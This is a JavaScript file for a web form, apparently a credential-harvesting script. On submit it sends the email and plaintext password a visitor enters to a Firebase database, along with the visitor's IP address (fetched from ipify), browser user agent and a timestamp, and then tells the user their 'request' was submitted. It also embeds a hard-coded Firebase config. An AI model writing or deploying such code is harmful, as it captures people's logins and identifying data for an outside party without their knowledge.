import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyAiKhYtKntdDXQHxvrKfYpOF9h6mr99aRk",
  authDomain: "asf-panel-azizul2.firebaseapp.com",
  databaseURL: "https://asf-panel-azizul2-default-rtdb.firebaseio.com",
  projectId: "asf-panel-azizul2",
  storageBucket: "asf-panel-azizul2.firebasestorage.app",
  messagingSenderId: "295528012300",
  appId: "1:295528012300:web:e3165c5001efda71ae6c29",
  measurementId: "G-D1X883TTNV"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
